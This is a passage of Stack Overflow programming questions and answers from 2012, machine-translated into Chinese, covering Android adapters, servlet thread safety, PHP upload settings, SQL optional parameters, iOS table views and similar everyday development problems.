```
if(mExpanded.contains(getItem(position))) {
  //show expansion
} else {
  //hide expansion
} 
```

然后在您的`onListItemClick`方法中添加以下内容：

```
if(!mExpanded.remove(getListView().getItem(position))) {
   mExpanded.add(getListView().getItem(position));
} 
```

这将导致它尝试删除该项目，如果`Set`没有更改 - 也就是说该项目不在`Set`要删除的范围内，那么您想要添加它......

# android - 如何在自定义列表视图中加载图像并在 Android 中执行此操作时显示进度条？

> ID：11603099
> 
> 赞同：0
> 
> 时间：2012-07-22T18:55:02.807
> 
> 标签：android

我在这里和其他地方阅读了很多关于在自定义列表视图中加载图像的帖子，但我一无所获！所以，我想我最好问问！

情况如下：

我有一个活动，上面有一个包含 6 个项目的列表视图（比如说 Item1、Item2 等）。当用户单击一个项目时，我使用另一个列表视图启动一个新活动，但这次列表视图是一个带有图像和一些文本的自定义视图。

第一个活动的 onCreate 方法是这样的：

```
GetImageFromURL eventImageLoader = new GetImageFromURL(FirstActivity.this, eventMultimediaID);
eventImageLoader.execute();

try {
    Thread.sleep(5000);
} catch (InterruptedException e) {
    e.printStackTrace();
}

CustomAdapter adapter = new CustomAdapter(this, android.R.layout.simple_expandable_list_item_1, R.id.textView1, eventName, bitmap);
eventList = (ListView) findViewById(R.id.secEventList);
eventList.setAdapter(adapter);
eventList.setOnItemClickListener(eventNameListClickListener); 
```

我创建并启动 AsyncTask 以将图像加载到位图列表中。

eventMultimediaID 是一个字符串数组，eventName 也是如此。

GetImageFromURL 任务是这样的：

```
public class GetImageFromURL extends AsyncTask<Void, Void, List<Bitmap>>
{
private ProgressDialog progressDialog = null;
private Context callingContext = null;
private List<Bitmap> bitmap = new ArrayList<Bitmap>();
private String[] eventMultimediaID = null;

public GetImageFromURL(Context callingContext, String[] eventMultimediaID)
{
    this.callingContext = callingContext;
    this.eventMultimediaID = eventMultimediaID;
}

@Override
protected void onPreExecute()
{
    super.onPreExecute();
    progressDialog = ProgressDialog.show(callingContext, "Loading Events", "Retrieving data from server, please wait...", true);
}

@Override
protected List<Bitmap> doInBackground(Void... params)
{       
    try
    {
        int length = eventMultimediaID.length;
        for(int i = 0; i < length; i++)
        {
            URL imageUrl = new URL("https://www.blahblah/servlet?blahblah=" + eventMultimediaID[i]);
            bitmap.add(i, BitmapFactory.decodeStream(imageUrl.openConnection().getInputStream()));
        }
    }
    catch (IOException e)
    {
        e.printStackTrace();
    }

    return bitmap;
}

@Override
protected void onPostExecute(List<Bitmap> bitmap)
{
    for(int i = 0; i < bitmap.size(); i++)
    {
        ShowEventCategory.bitmap.add(i, bitmap.get(i));
    }

    progressDialog.dismiss();
}
} 
```

这是CustomAdapter：

```
public class CustomAdapter extends ArrayAdapter<String>
{
private Context currentContext;
private String[] data;
private List<Bitmap> evImage;

public CustomAdapter(Context context, int resource, int textViewResourceId, String[] objects, List<Bitmap> bitmap)
{
    super(context, resource, textViewResourceId, objects);
    this.currentContext = context;
    this.data = objects;
    this.evImage = bitmap;
}

@Override
public View getView(int position, View convertView, ViewGroup parent)
{       
    LayoutInflater inflater = (LayoutInflater) currentContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    View eventListItem = inflater.inflate(R.layout.show_event_category_list_item, parent, false);

    ImageView eventListItemImage = (ImageView) eventListItem.findViewById(R.id.eventImage);
    TextView eventListItemText = (TextView) eventListItem.findViewById(R.id.eventText);

    eventListItemText.setText(data[position]);
    eventListItemImage.setImageBitmap(evImage.get(position));

    return eventListItem;
}
} 
```

我试图做的是从 Activity 调用异步任务来加载图像，同时显示一个加载对话框。加载完成后，对话框关闭，适配器获取填充的位图数组。

这行不通。任务启动后，执行继续（我认为这应该发生）并且适配器得到一个空数组，所以我得到一个 OutOfBoundsException。这就是为什么我将 Thread.sleep(5000) 放在主线程中等待加载操作完成的原因。但这当然不是一个可接受的解决方案！

:( 有什么建议吗？！我花了一整天的时间在这件事上！！！！提前谢谢！

# java - Servlet + 注入 - 多线程问题

> ID：11603100
> 
> 赞同：1
> 
> 时间：2012-07-22T18:55:09.747
> 
> 标签：java, multithreading, dependency-injection, glassfish-3, servlet-3.0

因此，对于一个学校项目，我们创建了一个网站，用户可以在其中提交有关水下生活等的报告。我们使用了简单的依赖注入 (javax.inject) 和错误检查模式，如下所示：

**报告服务.java**

```
public interface ReportService {
    public static enum ReportServiceErrorsENUM {
        DB_FAILURE, WRONG_COORD // etc
    }
    public Set<ReportServiceErrorsENUM> getLastErrors();
    public int addNewReport(Report report);
} 
```

**ReportServiceImpl.java**

```
public class ReportServiceImpl implements ReportService {

    private Set<ReportServiceErrorsENUM> lastErrors;
    private @Inject ReportDAO reportDAO;

    @Override
    public Set<ReportServiceErrorsENUM> getLastErrors() {
        return this.lastErrors;
    }

    @Override
    public int addNewReport(Report report) {
        lastErrors= new HashSet<ReportServiceErrorsENUM>();//throw away previous errors
        UserInput input = report.getUserInput();
        if (input.getLatitude() == null) {
            addError(ReportServiceErrorsENUM.WRONG_COORD);
        }
        // etc etc
        if (reportDAO.insertReport(report) != 0) {
            // failure inserting the report in the DB
            addError(ReportServiceErrorsENUM.DB_ERROR);
        }
        if (lastErrors.isEmpty()) // if there were no errors
            return EXIT_SUCCESS; // 0
        return EXIT_FAILURE;  // 1
    }
} 
```

**提交报告控制器.java**

```
@WebServlet("/submitreport")
public class SubmitReportController extends HttpServlet {
    private static final long serialVersionUID = 1L;
    private @Inject ReportService reportService;

    @Override
    protected void doPost(HttpServletRequest request,
    HttpServletResponse response) throws ServletException, IOException {
        Report report = new Report();
        // set the report's fields from the HttpServletRequest attributes
        if(reportService.addNewReport(report) == ReportService.EXIT_FAILURE) {
            for(ReportServiceErrorsENUM error : reportService.getLastErrors())
                // display the errors etc
        } else {
            // display confirmation
        }
    }
} 
```

这个想法是 Servlet 控制器调用服务（被注入）然后检查服务的返回值并在服务上调用 getLastErrors() 如果有错误 - 通知用户出了什么问题等等。现在我来了意识到这不是线程安全的 - @Inject'ed ReportService (reportService) 将由使用 servlet 的所有线程共享

1.  是（交叉手指）吗？
2.  如何改进这种错误机制？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:00:29.730

通常对于 servlet，您希望将这些变量（通常称为“状态”）保留在某些容器管理的上下文中。我会将这些错误移到请求范围内——这样它们就存储在请求对象上（从概念上讲），并且任何处理同一请求的 servlet/jsp/任何东西都可以看到/编辑它们。不同的请求意味着不同的数据存储。

可以在此处找到使用 servlet 请求范围的示例代码：[http ://www.exampledepot.com/egs/javax.servlet/State.html](http://www.exampledepot.com/egs/javax.servlet/State.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T19:02:11.497

您的设计既不是线程安全的，也不是准备好为多个用户提供服务。它不是线程安全的，因为多个用户（浏览器）可以同时访问 servlet，进而`lastErrors`同时访问设置。（是的，servlet 和您的服务只有一个实例）。`HashSet`您使用的*不是*线程安全的。

此外，如果两个不同的人尝试使用同一个应用程序，他们将覆盖并访问彼此提交的报告（错误）。换句话说，所有用户之间共享全局状态，而每个用户/会话应该有一个状态。

通过修复第二个问题（我给了你一个提示：使用`HTTPSession`），你不太可能看到第一个问题。这是因为很少看到对同一会话的并发访问。但这是可能的（并发 AJAX 请求，两个浏览器选项卡）。请记住这一点，但现在还有更重要的问题需要解决。

# asp.net - 会话变量不与 Internet Explorer 9 一起存储

> ID：11603105
> 
> 赞同：0
> 
> 时间：2012-07-22T18:55:21.573
> 
> 标签：asp.net, httpcontext, sessionid

我正在尝试使用 asp.net 中的以下代码将会话变量从一个页面传递到另一个页面：

```
HttpContext.Current.Session["FacebookID"] = id; 
```

这适用于 Firefox 和 Chrome，但当我尝试从 Internet Explorer 9 中的另一个页面获取该值时，它不起作用，我什至在兼容模式下尝试过。它只是返回空值。

有人对为什么我的会话变量不存储有任何建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T18:58:12.737

你在 IE 中关闭了 Cookies 吗？如果是这样，除非您将会话状态更改为无cookie，否则它将无法跟踪您的会话...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-07T14:50:25.093

我看到您已经得到了答案，但对于其他有同样问题的人来说：
这可能是隐私偏好 (P3P) 问题。在这种情况下，您必须添加 P3P 标头，例如...

```
HttpContext.Current.Response.AddHeader("p3p", "CP=\"IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\""); 
```

阅读 Peter Bromberg 的博客以了解更多信息：http: [//petesbloggerama.blogspot.se/2007/08/aspnet-loss-of-session-cookies-with.html](http://petesbloggerama.blogspot.se/2007/08/aspnet-loss-of-session-cookies-with.html)

# php - ini_set 不会覆盖 php 设置

> ID：11603112
> 
> 赞同：1
> 
> 时间：2012-07-22T18:56:37.563
> 
> 标签：php, file-upload

我正在尝试上传更大的文件，所以我在 php 代码中设置了这个

```
 ini_set('upload_max_filesize', '1000M');
ini_set('post_max_size', '1100M');
ini_set('memory_limit', '1200M'); 
```

但是 $_POST 和 $_FILES 是空的。但是当我更改 php.ini 设置时，它可以工作。为什么它不会即时更改设置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:00:07.640

看看这些：

[http://www.php.net/manual/en/ini.list.php](http://www.php.net/manual/en/ini.list.php)

[http://www.php.net/manual/en/configuration.changes.modes.php](http://www.php.net/manual/en/configuration.changes.modes.php)

阅读后，您似乎可以修改的唯一选项`ini_set`是`memory_limit`. 其他 2 可在 php.ini 文件、httpd.conf、.htaccess 或每个目录的 .user.ini 文件中进行配置。

这意味着，如果您想更改这些值，您必须有权访问服务器的配置！您将无法从脚本中负担得起！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T19:03:33.303

在 PHP 启动后更改这些设置为时已晚。

*   `upload_max_filesize`- 上传发生*在*PHP 脚本运行和你的 ini_set() 被执行之前
*   `post_max_size`- 同样地

即使您可以更改`memory_limit`（取决于服务器配置），如果您期望上传这么大，也为时已晚。

[`ini_set()`](http://php.net/ini_set)有关更多信息，请参见[http://www.php.net/manual/en/ini.list.php](http://www.php.net/manual/en/ini.list.php)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T19:03:48.877

每个脚本都不允许更改前两个设置，但即使它们*仍然*无效，因为文件/POST数据必须*在脚本运行之前*处理，这意味着设置不会有机会生效。

# sql - 如何使用 SQL 存储过程编写过滤查询？

> ID：11603116
> 
> 赞同：0
> 
> 时间：2012-07-22T18:57:29.887
> 
> 标签：sql, optional-parameters

如何编写一个 SQL 存储过程，其中我希望参数在 select 语句中是可选的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:02:12.977

试试这个.. 使控制过滤的 SP 输入参数可选，默认值为 null。在每个 select 语句的 Where 子句中，这样写谓词：

```
 Create procedure MyProcedure
  @columnNameValue [datatype] = null
  As

      Select [stuff....]
      From table
      Where ColumnName = Coalesce(@columnNameValue , ColumnName) 
```

这样，如果您不包含参数，或者如果您为参数传递空值，则 select 语句将过滤列值等于自身的位置（实际上根本不对该列进行过滤。）

唯一不利的是，它阻止您将空值作为有意义的值传递以仅显式过滤空值....（即，仅选择值为空的行）一旦上述技术具有被采用，您需要添加另一个参数来实现该类型的需求。（比如说，@GetOnlyNulls TinyInt = 0，或类似的东西）

```
 Create procedure MyProcedure
  @columnNameValue [datatype] = null,
  @GetOnlyNulls Tinyint = 0
  As

      Select [stuff....]
      From table
      Where (ColumnName Is Null And @GetOnlyNulls = 1)
            Or ColumnName = Coalesce(@columnNameValue , ColumnName) 
```

# java - 如何使用 UTF-8 读取 InputStream？

> ID：11603117
> 
> 赞同：8
> 
> 时间：2012-07-22T18:57:34.410
> 
> 标签：java, xml, utf-8, inputstream

欢迎大家

我正在开发一个 Java 应用程序，它从互联网上调用一个 PHP，它给了我一个 XML 响应。

响应中包含这个词：“Próximo”，但是当我解析 XML 的节点并将响应获取到 String 变量中时，我收到这样的词：“Próximo”。

我确定问题在于我在 Java 应用程序中使用了不同的编码，然后是 PHP 脚本的编码。然后，我想我必须将编码设置为与您的 PHP xml 中的 UTF-8 相同

这是我用来从 PHP 获取 XML 文件的代码。

**¿ 我应该在此代码中更改什么以将编码设置为 UTF-8？*（请注意，我没有使用缓冲阅读器，我使用的是输入流）***

```
 InputStream in = null;
        String url = "http://www.myurl.com"
        try {                              
            URL formattedUrl = new URL(url); 
            URLConnection connection = formattedUrl.openConnection();   
            HttpURLConnection httpConnection = (HttpURLConnection) connection;
            httpConnection.setAllowUserInteraction(false);
            httpConnection.setInstanceFollowRedirects(true);
            httpConnection.setRequestMethod("GET");
            httpConnection.connect();               
            if (httpConnection.getResponseCode() == HttpURLConnection.HTTP_OK)
                in = httpConnection.getInputStream();   

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();                     
            DocumentBuilder db = dbf.newDocumentBuilder();
            Document doc = db.parse(in);
            doc.getDocumentElement().normalize();             
            NodeList myNodes = doc.getElementsByTagName("myNode"); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-22T19:09:52.337

当您从中`InputStream`读取`byte[]`时。创建字符串时，传入`CharSet`“UTF-8”。例子：

```
byte[] buffer = new byte[contentLength];
int bytesRead = inputStream.read(buffer);
String page = new String(buffer, 0, bytesRead, "UTF-8"); 
```

请注意，您可能希望将缓冲区设置为合理的大小（如 1024），并不断调用`inputStream.read(buffer)`.

* * *

@阿米尔帕沙扎德

是的，您也可以使用 InputStreamReader，并尝试将 parse() 行更改为：

```
Document doc = db.parse(new InputSource(new InputStreamReader(in, "UTF-8"))); 
```

# ios - 普通视图控制器内的表格视图

> ID：11603119
> 
> 赞同：2
> 
> 时间：2012-07-22T18:57:37.110
> 
> 标签：ios, uitableview, uiviewcontroller, storyboard

我正在做这个 iPhone 项目，我需要在普通视图控制器中有一个（动态）表视图。我没有选择 Table View Controller，因为我需要在页面中放置其他东西。想象一个带有文本字段、按钮和我的大约 4-5 个单元格的小表格视图的页面。

当我运行该应用程序时，我需要触摸一个按钮来切换到该视图。我单击按钮，应用程序崩溃并告诉我：

> 2012-07-22 14:40:57.304 多少？[3055:f803] *** -[UITableView _createPreparedCellForGlobalRow:withIndexPath:]、/SourceCache/UIKit_Sim/UIKit-1914.84/UITableView.m:6061 中的断言失败

这是我的 .H 文件：

```
#import <UIKit/UIKit.h>

@interface ProjectViewController : UIViewController <UITableViewDelegate, UITableViewDataSource>

@end 
```

这是我的 .M 文件：

```
#import "ProjectViewController.h"

@interface ProjectViewController ()

@end

@implementation ProjectViewController

//MyViewController.m
#pragma mark - Table View Data Source
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    NSLog(@"numberOfSectionsInTableView");
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    NSLog(@"numberOfRowsInSection");
    return 5;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    NSLog(@"cellForRowAtIndexPath");

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"cell"];

    NSLog(@"cellForRowAtIndexPath");

    cell.textLabel.text = @"Test";

    return cell;
}

@end 
```

我从表视图控制拖动到我的控制器来设置委托和数据源。

我做错了什么？？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:31:36.627

尝试在您的`.h`文件中制作一个插座并将其连接到`tableView`您的`storyboard`

**项目视图控制器.h**

```
@property (nonatomic, strong) IBOutlet UITableView *myTableView; 
```

**项目视图控制器.m**

```
@synthesize myTableView;

...

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    NSLog(@"cellForRowAtIndexPath");

    UITableViewCell *cell = [self.myTableView dequeueReusableCellWithIdentifier:@"cell"];

    NSLog(@"cellForRowAtIndexPath");

cell.textLabel.text = @"Test";

return cell; 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-23T14:44:54.707

在你的 -cellForRowAtIndexPath 中，如果你这样做，你会没事的。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
NSLog(@"cellForRowAtIndexPath");

UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"cell"];

if(cell == nil)
{
    cell = [[UITableViewCell alloc] 
             initWithStyle:UITableViewCellStyleDefault 
             reuseIdentifier:@"cell"];
}

NSLog(@"cellForRowAtIndexPath");

cell.textLabel.text = @"Test";

return cell; 
```

}

问题是您的单元从未分配和初始化内存。这就是你得到错误的原因。

# database - 没有主外键匹配的表

> ID：11603120
> 
> 赞同：0
> 
> 时间：2012-07-22T18:57:39.187
> 
> 标签：database, key, primary-key

数据库中是否可以有一个没有主外键匹配的表？

该表将保存指向我要上传的特定文件和目录的文件路径，这些文件和目录与数据库中的任何其他表都不相关。这是一种好的做法，还是所有表都应该有一个主外键匹配？如果是这样，我应该只用这个表创建一个单独的数据库吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:58:11.927

每个表都应该有一个键，但这并不意味着它必须有一个引用它的*外键。*密钥的目的是确保数据是唯一可识别的，并保证强制执行预期的依赖集。

# python - Python中的定时器可以通过函数互相调用吗？

> ID：11603125
> 
> 赞同：0
> 
> 时间：2012-07-22T18:58:07.047
> 
> 标签：python, multithreading, timer

我有一个 Python 脚本，它以一个代码块开头，应该让一切都保持在正轨上。此代码调用打印一些文本并启动 Timer 的函数（来自 threading 模块）。Timer 调用的函数也打印文本，但该函数从不执行。

```
from threading import Timer

def func1():
    print "func1 successful"
    t = Timer(1, func2)
    t.start

def func2():
    print "func2 successful"

####program start####
print "test start"

func1() 
```

上面的简化版本在打印两行文本后退出。我尝试在底部添加一个无限循环以使程序等待计时器，但随后它只是未能退出。为什么第二个功能不运行？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T19:03:35.343

因为你没有调用 start 函数。

从线程导入计时器

```
def func1():
    print "func1 successful"
    t = Timer(1, func2)
    t.start()
    #      ^^

def func2():
    print "func2 successful"

####program start####
print "test start"

func1() 
```

现在应该工作

# php - 您如何为用户创建一个 html/php 文件以确认他们想要注册或确保用户提供了正确的电子邮件地址？

> ID：11603126
> 
> 赞同：-3
> 
> 时间：2012-07-22T18:58:10.010
> 
> 标签：php, forms, activation

这应该相当简单。我知道我该怎么做，但我想对如何做到这一点有一些想法，因为我认为应该有很多其他方法可以做到这一点。当您在网站上注册一个帐户时，您必须转到您的电子邮件并转到一个链接才能激活您的帐户。您如何知道用户访问了该链接以激活他们的帐户？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:03:10.713

看看这个方案的任何实现。您会看到在向您发送此电子邮件时生成的一些唯一字符串。当您单击链接时，它会被传回网站——这就是它被识别的方式。

通常假设没有其他人可以知道这个唯一的字符串，因此打开此链接的访问者被认为是提供电子邮件的人，因此谁可以访问它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T19:04:03.693

创建帐户时，会生成一个确认令牌，将其存储在数据库中并通过电子邮件发送给用户（作为该链接的一部分）。

当访问链接时，该令牌用于在数据库中查找匹配的行并使用它来使帐户处于活动状态。

# ios - 另一个视图中的 ASIHTTPRequet 进度条

> ID：11603130
> 
> 赞同：0
> 
> 时间：2012-07-22T18:58:33.203
> 
> 标签：ios, progress

所以，我为我的 ASIHTTPRequest 和一个网络队列创建了一个单例类。它在后台下载文件没有问题。但是，因为我是从一个视图开始下载，然后用户可以选择更改选项卡以查看下载队列。当我切换到选项卡时，进度条没有更新。我不确定如何在另一个视图控制器中获取进度条以进行更新。

```
if (!self.queue) {
    appDelegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    self.queue = [[[ASINetworkQueue alloc] init] autorelease];
    [self.queue setMaxConcurrentOperationCount:1];
    [self.queue setDownloadProgressDelegate:self];
}

ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:url];

[request setDownloadDestinationPath:desPath];
[request setDelegate:self];
[request setDidFinishSelector:@selector(requestDone:)];
[request setDidFailSelector:@selector(requestWentWrong:)];
[self.queue addOperation:request]; //queue is an NSOperationQueue
[self.queue go]; 
```

那么问题来了：既然上面的代码是在后台运行的，那么如何设置setDownloadProgressDelegate来更新另一个视图控制器中的progressView呢？我已经有一个包含要下载的文件的 tableview，并且在 tableview 上方有一个视图，应该显示正在下载的文件的进度。添加到队列和下载不是问题。它只是让进度条更新。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:03:17.427

尝试将 DownloadProgressDelegate 设置为另一个类，例如您的 AppDelegate，并使用它来决定在哪个视图中更新进度条。

# python - 我可以采取哪些安全措施来保护无法在数据库中散列的密码？

> ID：11603136
> 
> 赞同：0
> 
> 时间：2012-07-22T18:59:06.017
> 
> 标签：python, mysql, hash, passwords

我正在制作一个应该包含密码安全类型功能的公司后端。显然密码需要是纯文本，以便用户可以阅读它们，或者至少以某种方式“可逆”为纯文本，所以我不能使用哈希。

除了将纯文本密码放入数据库之外，我还能做些什么更*安全的事情？*

* * *

*注意：这些（大部分）是自动生成的密码，除了保存它们的目的（主要是 FTP 服务器凭据）之外，它们永远不会重复用于任何用途。*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:15:12.440

您可以使用 MySQL 的`ENCODE()`或`DES_ENCRYPT()`函数`AES_ENCRYPT()`，并将用于加密的密钥存储在安全位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T19:00:26.813

使用加密。密码不会是纯文本的，所以你会有一些安全性，但它可以被逆转。

[此答案](https://stackoverflow.com/a/2448441/250259)中的代码应该可以解决问题。

# java - 安装 Eclipse 似乎没有用

> ID：11603139
> 
> 赞同：0
> 
> 时间：2012-07-22T18:59:12.027
> 
> 标签：java, eclipse, installation

我已经安装了 Eclipse 并尝试了几次“Hello World”程序，但由于某种原因它似乎从来没有工作过，谁能帮我解决这个问题，因为我很迷茫，因为我从未使用过 Eclipse之前，这是我的用户界面的屏幕截图以及我得到的错误：![](../Images/c2a5a37ed42a6c4ebac42d1b06d0ffa0.png)

此外，我可能忘记了一些非常了解我的基本知识，因为自从我上次编程以来已经有几个月了，尽管如此，请随意提及。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:15:26.407

您正在尝试运行一个充满编译器错误的程序，所以难怪它不起作用。在您的情况下，它是 JRE 配置——您需要将已安装的 JRE 绑定到 Eclipse 的 JRE 设置。您可以键入 Ctrl-3、jre、回车，您将能够直接进入正确的首选项页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T19:15:02.467

Eclipse 无法找到 HelloWorld.class 文件。可能是由于编译时问题。您可以检查项目的输出目录，天气 .class 文件是否存在。

# javascript - Firefox ChromeWorker 未加载脚本

> ID：11603147
> 
> 赞同：1
> 
> 时间：2012-07-22T19:00:24.950
> 
> 标签：javascript, firefox, firefox-addon, jsctypes

我有一个要求，我需要与本机代码进行通信以执行某些操作。我通过使用 JS-Ctypes 取得了成功，事情正在按预期进行。由于我的 Web 应用程序与本机代码的通信需要一些时间，因此阻塞了主 JS 线程，从而冻结了 UI。

因此，我需要创建一个单独的线程来委派与本机代码的通信，并将结果回发到主线程，这将为用户提供适当的反馈。Firefox [ChromeWorker](https://developer.mozilla.org/en/DOM/ChromeWorker)正是我需要使用的，因为它们是可以访问 JS-Ctypes 的独立线程。

我的问题是，在我的一生中，我似乎无法使用这种方法加载脚本。这是我目前拥有的：

main.js

```
netscape.security.PrivilegeManager.enablePrivilege('UniversalXPConnect');                         
Components.utils.import("resource://gre/modules/Services.jsm");

var worker = new ChromeWorker("js/fpman/myworker.js");
worker.onmessage = function(e){
      console.log(e.data);
};

worker.postMessage('start'); 
```

myworker.js

```
self.onmessage = function(e){
   var sum = 1 + 1;
   postMessage("Sum is " + sum);
}; 
```

当该代码在主 JS 中运行时，我在 firebug 控制台上收到此错误

```
Failed to load script: http://localhost:8080/myapp/js/fpman/myworker.js (nsresult = 0x805303f4) 
```

需要注意的是，当我使用普通的工作线程时，即

```
var worker = new Worker("js/fpman/myworker.js"); 
```

js 文件 (myworker.js) 加载正常，我得到了预期的结果，但这当然不能满足我的需要，因为普通工作人员无法访问 JS-Ctypes。所以看来问题是如何创建 ChromeWorker。有人可以告诉我如何从应用程序中适当地实例化和使用 ChromeWorker 对象。我在扩展中看到了很多使用 ChromeWorker 的参考，但这不是我想要的，我想在我的 Web 应用程序中使用 ChromeWorker。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T17:16:02.680

该特定错误是 NS_ERROR_DOM_BAD_URI

我不相信您正在做的事情会起作用，而且我知道它不会很快在 Firefox 中起作用，因为 enablePrivilege 将完全消失。

# php - PHP：open_basedir 允许的路径

> ID：11603156
> 
> 赞同：6
> 
> 时间：2012-07-22T19:01:30.387
> 
> 标签：php, open-basedir

我`is_dir`在一个页面上有几个电话。他们一直工作没有问题。

几天前，托管公司将 PHP 从 5.2 升级到 5.3。从那时起，我所有的电话`is_dir`都导致了以下错误（消息）：

```
Warning: is_dir(): open_basedir restriction in effect.
File(/home/virtual/domain.com/public_html/galleries/img/002.JPG/)
is not within the allowed path(s):
(/home/virtual/domain.com:/home/virtual/_tmp)
in /home/virtual/domain.com/public_html/index.php on line 201 
```

这让我很困惑。

显然，根据错误消息（`php_info`以及），目录`/home/virtual/domain.com`（没有尾部斜杠，因此包括子目录）包含/启用`open_basedir`，并且`is_dir`尝试迭代的文件都位于该文件夹下的子文件夹中。那么为什么它们不在允许的路径之内呢？显然他们是！

奇怪的是，这个错误*似乎*只在`is_dir`返回 false 时出现，即文件**不是**文件夹，而是普通文件时。它似乎可以遍历目录而不会引发错误。

以前在这里发布的类似问题：[Open_basedir 限制奇怪](https://stackoverflow.com/questions/7586616/open-basedir-restriction-oddness)（未找到解决方案）。

有人有想法么？

*（注意：更改 PHP 设置不是一个选项，因为这是一个共享主机，我没有任何管理员访问权限）*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T09:19:44.440

原来答案非常简单，但完全不合逻辑：

在创建（连接）要遍历的路径时，出于某种原因，我硬编码了一个尾部斜杠——注意上面的路径是如何`img/002.JPG/`以斜杠结尾的。删除此斜杠修复了错误。这也解释了为什么它没有在目录（应该有斜杠）上失败，只有文件（不是）。

按照 PHP 文档的说明，如果指定的路径代表现有目录，则`is_dir()`应该返回；`TRUE`在所有其他情况下，`FALSE`包括指定的文件不存在（不存在`img/002.JPG/`）。

所以我仍然有点困惑，为什么它不只是返回`FALSE`它在 PHP 5.2 中的方式，而是使这个相当深奥，坦率地说只是完全*错误*的声明，即文件不在允许的路径内……但在至少它现在又可以工作了。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-15T15:35:01.297

当您打开或检查以存在文件作为前缀且不存在部分作为后缀的路径时，会触发 PHP 中未修复的错误。在您的示例中，`/home/virtual/domain.com/public_html/galleries/img/002.JPG`存在后缀不存在的部分`/`（路径中的斜杠）。

有解释说这不是错误：“这是预期的行为。不存在的非路径（带有斜杠的路径）被认为在 basedir 之外。”，但我不这么认为。仅当路径的第一部分是现有文件时才会触发此错误。

PHP 错误：

*   [“错误 #54419 :: is_dir() 调用带有斜杠的文件以在 open_basedir 时抛出警告”](https://bugs.php.net/bug.php?id=54419)
*   [“错误 #52065 :: 在将文件作为目录访问时有关 open_basedir 限制的警告”](https://bugs.php.net/bug.php?id=52065)

# iphone-developer-program - Apple 开发者计划注册 ID

> ID：11603157
> 
> 赞同：3
> 
> 时间：2012-07-22T19:01:31.650
> 
> 标签：iphone-developer-program

我不知道在这里问这个问题是否正确，但我相信你们中的许多人都知道答案。目前我正在申请Apple iOS Developer Program。我填写了购买表格，但我可以找到**Apple Developer Program Enrollment ID**。我只找到了个人 ID、个人 ID（我在购买表格中使用的）和公司 ID（不知道这是什么意思，因为我注册为个人开发者）。

**问：**我在哪里可以找到 Apple Developer Program 注册 ID？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T19:19:46.713

这是您将用于登录开发者门户的 iTunes Store 帐户 (Apple ID)。如果您已经有一个使用，如果没有，则创建一个[http://support.apple.com/kb/ht2731](http://support.apple.com/kb/ht2731)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-22T20:20:12.057

为什么需要 Apple Developer Program 注册 ID？

这个周末我也试着申请了 iOS 开发者计划。我申请了，我付款了，我得到了我的激活码。但是当我尝试使用我的 Apple ID 激活时，我收到一条错误消息，说（在我的情况下）他们“无法成功验证我的身份”。在该错误消息中，有一个由字母和数字组成的注册 ID#，总共 10 个字符，我应该在联系支持人员时就此问题提供该 ID。

我在流程的其他地方没有看到相同的注册 ID，因此我认为它是我注册流程的某种内部 ID，您应该只在流程中遇到一些问题时才能看到/使用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-31T16:51:33.707

我遇到了同样的问题——在给他们的客户支持打电话时，他们说这是因为我的 Apple ID 使用了我的昵称“Jim”，但我输入的开发者信息是“James”。他们说人类最终会审查这些块，但这可能需要时间。请务必尝试使用完全相同的信息。

# php - 尽管有预期值，但得到整个页面的结果

> ID：11603162
> 
> 赞同：0
> 
> 时间：2012-07-22T19:02:10.930
> 
> 标签：php, ajax, forms, select

我有这样的情况。有如下所示的选择表单，并且想要调用 ajax 函数来获取结果取决于更改选择表单，但是从 ajax 获取整个页面

这是脚本

```
<html>
<head>
    <title>HI</title>
    <link rel="stylesheet" href="./scripts/css/default.css">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>

<form method="post">
<select name="s" id="s">
    <option value="one">A</option>
    <option value="two">B</option>
    <option value="three">C</option>
</select>
</form>

Hello guys ...
